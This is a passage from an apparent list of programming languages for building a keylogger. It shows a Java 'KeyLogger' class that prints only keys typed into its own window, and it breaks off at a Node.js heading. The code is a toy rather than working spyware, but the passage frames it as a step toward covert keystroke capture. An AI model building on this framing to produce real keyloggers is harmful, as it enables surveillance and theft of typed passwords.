#### 3. **Java**
- **Why Chosen**: Java provides a robust environment for cross-platform development and has built-in security features. It is also good for handling low-level operations through native methods.
- **Example**:
  ```java
  import java.awt.event.*;

  public class KeyLogger implements KeyListener {
      @Override
      public void keyTyped(KeyEvent e) {
          System.out.println("Key typed: " + e.getKeyChar());
      }

      @Override
      public void keyPressed(KeyEvent e) {
          System.out.println("Key pressed: " + e.getKeyChar());
      }

      @Override
      public void keyReleased(KeyEvent e) {
          System.out.println("Key released: " + e.getKeyChar());
      }

      public static void main(String[] args) {
          java.awt.Frame frame = new java.awt.Frame();
          frame.addKeyListener(new KeyLogger());
          frame.setSize(300, 200);
          frame.setVisible(true);
      }
  }
  ```

#### 4. **JavaScript (Node.js)**
- **Why Chosen**: Node.js is great for server-side scripting and can be used for real-time applications. It can interact with the operating system through native modules.
- **Example**:
